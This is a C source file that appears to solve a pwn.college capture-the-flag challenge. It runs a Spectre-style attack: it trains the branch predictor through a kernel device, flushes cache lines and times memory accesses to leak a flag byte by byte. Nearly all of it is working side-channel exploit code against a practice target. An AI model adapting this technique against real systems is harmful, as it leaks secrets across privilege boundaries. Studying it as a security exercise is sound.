#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000

#define FLAG_PREFIX "pwm.college"
#define FLAGLEN  59 
#define START 32
#define END 0x7f

#define THRESHOLD 220
#define TRAIN_FOR 5 // :)


struct __shmem {
    uint8_t  idx;
    uint8_t count;
}* shmem = NULL;


struct page_data {
    char data[PAGE_SIZE];
}* page_ptr = NULL;


static int dev_fd;


#define COMM int __rc__ = ioctl(dev_fd, 0, 0); \
;//            fprintf(stderr, "rc: %s\t", (__rc__) ? "true" : "false");
#define for_each_char(var) for (int var = START; var < END; var++)

size_t measure(void* ptr)
{
    register void* reg_ptr asm("rdi") = ptr;
    size_t start, end;

    start = __rdtsc();
    _mm_lfence();
    asm volatile("mov r8, qword ptr [%0]"
                :
                : "r" (reg_ptr)
                : "r8"
                );
    _mm_lfence();
    end   = __rdtsc();

    return end - start;
}

void flush_pages(int start, int end, void* mem)
{
    for (int i = start; i < end; i++)
        _mm_clflush(mem + PAGE_SIZE * i);
}

void train_target()
{
    shmem->count = TRAIN_FOR;
    COMM
}

size_t get_threshold()
{
#define KNOWN_DATA FLAG_PREFIX
#define NUM sizeof KNOWN_DATA-1

    size_t sum = 0;
    for (int i = 0; i < NUM; i++)
    {
        shmem->idx = i;
        shmem->count = TRAIN_FOR;
        _mm_clflush(&page_ptr[KNOWN_DATA[i]]);

        COMM

        size_t time = measure(&page_ptr[KNOWN_DATA[i]]);
        if (time < THRESHOLD) {
            sum += time;
            printf("Iter #%2d time: %zu\n", i, time);
        }
        else {
            printf("Iter #%2d again...\n", i);
            i--;
        }
    }

    return sum / NUM;
}

/*
size_t get_threshold()
{
#define KNOWN_DATA FLAG_PREFIX
#define NUM sizeof KNOWN_DATA-1

    size_t sum = 0;
    for (int i = 0; i < NUM; i++)
    {
        shmem->idx = i;
        train_target();
        shmem->count = 0;

//        flush_pages(START, END, page_ptr);
        _mm_clflush(&page_ptr[KNOWN_DATA[i]]);

        COMM

        size_t time = measure(&page_ptr[KNOWN_DATA[i]]);
        if (time < THRESHOLD) {
            sum += time;
            printf("Iter #%2d time: %zu\n", i, time);
        }
        else {
            i--;
        }
    }

    return sum / NUM;
}
*/

int main(void)
{
    char flag[FLAGLEN] = {0};
    size_t threshold;

    dev_fd = open("/proc/pwncollege", O_RDWR);
    if (dev_fd < 0) {
        perror("open");
        exit(1);
    }

    shmem = mmap((void*)0x10000, 0x100000,
                 PROT_WRITE | PROT_READ,
                 MAP_SHARED | MAP_POPULATE,
                 dev_fd, 0);
    if (shmem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    page_ptr = (void*)shmem;
    printf("ptr: %p\n", page_ptr);

AGAIN:
    threshold = get_threshold();
    printf("Threshold: %zu\n\n", threshold);

    for (int i = 0; i < FLAGLEN; i++)
    {
        size_t hits[END] = {0};

        for (int _ = 0; _ < 500; _++) 
        {
            train_target();
            shmem->idx = i;
            shmem->count = TRAIN_FOR;

            flush_pages(START, END, page_ptr);

            COMM

            for_each_char(j)
            {
                volatile int mix_j = (((j * j) * 2));
                mix_j = ( mix_j / j ) ^ 1;
                mix_j ^= 1;
                mix_j /= 2;

                size_t time = measure(&page_ptr[mix_j]);
                if (time <= threshold)
                    hits[mix_j] += 1;
            }
        }

        size_t max_hits = 0;
        int ch = 0;
        for_each_char(j)
        {
            size_t hit = hits[j];
            if (hit)
                printf("%2d/%3d (%c) - hits: %ld\n", i, j, j, hit);
            if (hit && max_hits < hit) {
                max_hits = hit;
                ch = j;
            }
        }

        if (ch) {
            flag[i] = ch;
            printf("\n\n - %c with hits of %zu - \n\n", flag[i], max_hits);
            if (i == sizeof FLAG_PREFIX-2 
            && memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX-1)) 
            {
                printf("problem!: %s\n", flag);
                getchar();
                goto AGAIN;
            }
        }
        else 
            i--;
    }

    printf("flag: %s\n", flag);
}
